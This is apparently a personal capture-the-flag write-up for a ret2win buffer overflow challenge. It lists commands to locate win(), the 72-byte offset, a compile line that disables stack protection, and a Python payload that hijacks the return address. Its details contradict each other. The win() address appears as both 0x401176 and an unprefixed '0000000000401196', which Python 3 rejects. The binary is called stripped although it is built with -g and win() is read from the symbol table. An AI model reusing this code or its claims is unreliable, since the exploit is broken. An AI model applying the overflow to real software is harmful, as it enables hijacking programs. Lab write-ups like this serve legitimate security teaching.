# Buffer Overflow - Personalised Write‑up


**Category:** Binary Exploitation – 150 pts  
**Flag:** `flag{buffer_overflow_ex}`
---


## Challenge Flow

1. Locate `win()` by using readelf -s bof | grep ' win'
2. Discover buffer size using objdump -d bof -Mintel | sed -n '/vuln:/,/retq/p'
3. Compute overflow offset where it is 64 to fill up the buffer and the 8 more bytes to overwrite the code. 
4. Build the payload

payload = b"A"\*72 + struct.pack("\<Q", 0x401176)

5. Trigger the exploit and get the flag of  flag{buffer_overflow_ex}

---

## How Difficulty Was Increased and Defense Mechanisms

I increased the difficulty by not using symbols except in symbol table such that the win() must be hunted itself, this is done through a stripped binary. Furthermore, I enabled NX so that you cant run the shellcode-must ret2win to solve the problem. The provided binary contains a vulnerable function that reads user input into a 64‑byte buffer on the stack using gets. You locate win() by inspecting the symbol table, determine the overflow offset , build a 72‑byte payload address of `win()`, and put it into the binary to hijack execution. The defense mechanisms were the stripped symbols. 

---

### Build Notes

This task is a classic ret2win: `gets()` overflows a 64‑byte stack buffer and lets us return to `win()`.

It is made using this command
```bash
gcc -O0 -g -fno-stack-protector -no-pie -z noexecstack -o bof bof.c
```

### Solution Notes


1. Find `win` address

```bash
readelf -sW ./bof | grep ' win'
```

2. Find offset = 64 (buf) + 8 (saved RBP) = 72.

3. Exploit

```bash
python3 - <<'PY' | ./bof
import struct, sys
win = 0000000000401196
sys.stdout.buffer.write(b"A"*72 + struct.pack("<Q", win))
PY
```

and it prints the flag





---

## Related & Future Variants

- Bypasses like ASLR, Partial-RELRO, Shadow-Stack
- ret2libc / ret2plt / ret2dlresolve style binary exploitations
- Format‐string vulnerabilities 


---

### Sources

- **GDB and pwndbg documentation**: https://github.com/pwndbg/pwndbg
- **ret2win challenges on ROP Emporium**: https://ropemporium.com/
* **Pwntools documentation**: https://docs.pwntools.com/
* **OverTheWire wargames**: https://overthewire.org/wargames/
